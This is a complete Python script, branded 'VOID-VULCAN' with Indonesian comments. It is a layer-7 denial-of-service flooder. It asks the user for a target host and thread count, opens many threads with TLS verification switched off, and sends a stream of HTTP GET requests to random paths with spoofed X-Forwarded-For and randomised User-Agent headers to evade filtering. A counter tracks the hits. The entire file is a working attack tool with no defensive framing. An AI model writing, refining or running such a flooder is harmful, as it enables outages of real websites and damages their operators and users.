import socket
import os
import sys
import time
import threading
import random
import string
import ssl

def get_logo():
    return r"""
 ░▒▓██████▓▒░      ▄▄██████▄▄      ░▒▓██████▓▒░
 ░▒▓██▓▒░        ▄████████████▄        ░▒▓██▓▒░
 ░▒▓██▓▒░       ███ ▀▄ ▓▓ ▄▀ ███       ░▒▓██▓▒░
 ░▒▓██▓▒░       ███ ▓▓ ▼▼ ▓▓ ███       ░▒▓██▓▒░
 ░▒▓██▓▒░        ▀████████████▀        ░▒▓██▓▒░
  ░▒▓██▓▒░         ▀▀██████▀▀         ░▒▓██▓▒░
 
        ╔══════════════════════════════════╗
        ║      V O I D - V U L C A N       ║
        ╚══════════════════════════════════╝
           [ MODE: RAPID BYPASS / LAYER 7 ]
    """

total_hits = 0
hit_lock = threading.Lock()

def attack_engine(target, port, ssl_on, ip):
    global total_hits
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            
            if ssl_on:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            
            s.connect((ip, port))

            for _ in range(30):
                rnd_path = ''.join(random.choices(string.ascii_lowercase, k=8))
                header = (
                    f"GET /{rnd_path} HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/{random.randint(100,120)}.0.0.0\r\n"
                    f"Accept: */*\r\n"
                    f"Accept-Encoding: gzip, deflate, br\r\n"
                    f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
                    f"Cache-Control: no-cache\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                )
                s.send(header.encode())
                with hit_lock:
                    total_hits += 1
            s.close()
        except:
            # Biarkan thread tetap hidup walau koneksi gagal (agar terus mencoba)
            pass

def run_ddos():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(get_logo())
    
    target = input("\n [?] Target (Host Only): ").strip()
    port = int(input(" [?] Port (443/80): ") or 443)
    ssl_on = True if port == 443 else False
    threads = int(input(" [?] Threads: ") or 200)

    try:
        ip = socket.gethostbyname(target)
    except:
        print("[!] Host tidak dikenal atau DNS error.")
        return

    # --- PERBAIKAN UTAMA ADA DI OUTPUT ---
    print(f"\n [!] LAUNCHING VULCAN TO {target} ({ip})...")
    sys.stdout.flush()  # Paksa tampilkan teks ini sekarang juga

    # Jalankan semua thread
    for i in range(threads):
        threading.Thread(target=attack_engine, args=(target, port, ssl_on, ip), daemon=True).start()

    time.sleep(1)  # Beri napas sebentar sebelum monitor jalan

    # Loop monitor dengan PRINT bawaan Python (paling aman untuk semua terminal)
    while True:
        try:
            # end="" dan flush=True memastikan tidak ada buffer yang menahan
            print(f"\r [★] Total Hits: {total_hits} | Status: BURNING...", end="", flush=True)
            time.sleep(0.5)
        except KeyboardInterrupt:
            print("\n\n[!] DDoS dihentikan manual.")
            break

if __name__ == "__main__":
    run_ddos()
